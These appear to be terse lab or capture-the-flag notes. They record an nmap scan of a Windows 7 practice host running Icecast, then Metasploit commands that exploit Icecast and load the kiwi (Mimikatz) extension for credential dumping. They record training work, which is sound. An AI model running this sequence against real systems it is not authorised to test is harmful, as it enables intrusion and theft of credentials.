```
export IP=10.10.193.66

Nmap
---------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_ssl-date: 2020-09-03T16:56:39+00:00; 0s from scanner time.
5357/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         syn-ack ttl 127 Icecast streaming media server
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
---------------------------------

Metasploit (Icecast Exploit)
---------------------------------
msfconsole
search icecast 
use 0
set options 
run
load kiwi
---------------------------------

```